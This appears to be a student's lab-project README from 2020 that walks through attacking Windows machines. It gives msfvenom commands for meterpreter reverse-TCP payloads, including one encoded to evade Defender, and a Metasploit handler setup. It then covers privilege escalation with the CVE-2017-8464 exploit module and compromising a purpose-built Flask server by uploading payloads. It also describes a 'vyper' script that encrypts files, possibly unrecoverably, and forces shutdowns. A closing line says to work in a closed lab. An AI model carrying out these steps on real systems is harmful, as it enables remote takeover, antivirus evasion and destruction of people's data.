PROJECT NOTES AND REQS.
Created by: Jameson Pagsolingan Feb. 2020

Website Usage
--------------------------------------------------------------------------------------------------------------
Inside the Website folder everything is packaged as it is meant to be
To add a webpage simply drop the pages HTML into 'templates' and be sure to make sure to write a app route function in python
app route ex.
@app.route('whatever url extension you want')
def render_my_page():
	return render_template('your HTML')

Procedure
--------------------------------------------------------------------------------------------------------------
For Kali install:
	Use Kali versions below 2020.1
	GUI install or Live boot; it really doesn't matter unless you want to save your work
	In terminal prepare two payloads by doing the following:
		msfvenom -p windows/meterpreter/reverse_tcp LHOST={Your Kali's IP addr} LPORT=4444 -f exe>{app_name}.exe -o/root/Desktop/{same app name}.exe
		msfvenom -p windows/meterpreter/reverse_tcp LHOST={Your Kali's IP addr} LPORT=4444 -e {Use some sort of encryption otherwise defender will block it} -f exe>{app_name}.exe -o/root/Desktop/{same app name}.exe
	Prepare a Reverse TCP handler by doing the following in another terminal instance:
		msfconsole
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST {Your Kali's IP}
		set LPORT 4444
		exploit
	We'll Come back to this, but for now continue on

For Win 7 Machine (Make sure it is SP1 or lower):
	install Win7 32 or 64 bit
	Get the NON-encrypted exe made in kali onto the Win 7 machine and execute

On Kali:
	A meterpreter session should have opened after running the exe on win7
	NOTE: This session is NOT privileged meaning no hashdumps or anything else fun
	Background it for now by typing "background" or hitting cntr-c and typing y
	show sessions to see what session ID meterpreter is running on
	use exploit/windows/local/cve_2017_8464_lnk_lpe
	set SESSION {whatever your meterpreter session is}
	exploit
	CONGRATULATIONS YOU ARE NOW IN A FULLY PRIVILEGED COMMAND SHELL
	CONFIRM BY DOING A whoami
	Do what you want then background the session
	Load up the reverse tcp handler again
For Web Server(any Windows os that can run Python3):
	Download/Install Python3.x - python.org
	Download/Install Flask - run this cmd -> "pip install Flask" (needs python obviously)
	Create Folder C:\Web Server and C:\Web Server\Uploads
	Extract Contents of Flask App into Web Server
	Run Py files in the Web Server folder by doing these commands:
	cd C:\Web Server
	py Web_Server_V2.1.py
	IN A NEW CMD PROMPT:
	cd C:\Web Server
	py authorize.py
	CONGRATULATIONS YOU NOW HAVE A FUNCTIONING WEB SERVER
	see readme in Flask App folder for more info
On Kali
	Navigate to Server web page by IP or DNS name
	Login with any credentials in lwdatabase.json
	Access the file server via link in the current page in order to upload payload files in vyper folder
	Upload files in vyper folder DO NOT RENAME ANY OF THESE, IF YOU DO THEY WILL NOT WORK RIGHT
	go back to profile and access virtual app page
	type in 'vyper_script.py' and submit
	A meterpreter session has been created
	depending on who launched the py program you may or may not be elevated
	if not type getsystem in meterpreter shell
	CONGRATULATIONS YOU HAVE BROKEN INTO THE WEB SERVER

BUT WAIT THERE'S MORE:
Try running vyper.py from a windows shell
do this by typing 'shell' in the meterpreter session associated with the server
navigate to C:\Web Server\Uploads
type "py vyper.py"
This is an interactive script meant to reek (reak?) havok on any windows system 
The counter phrases and pin/key info is held inside their respective JSONs write em down or snap a pic or something?
I am not sure if encrypted files are retrievable, I didn't test that function. Don't encrypt anything you actually want to be able to access! (unless you made an unencryption program)
NUKE THE MACHINE doesn't actually nuke it, it justs forces a shutoff.
TAKE CAUTION!!!!!

That's all folks; remember to do this in a closed lab environment
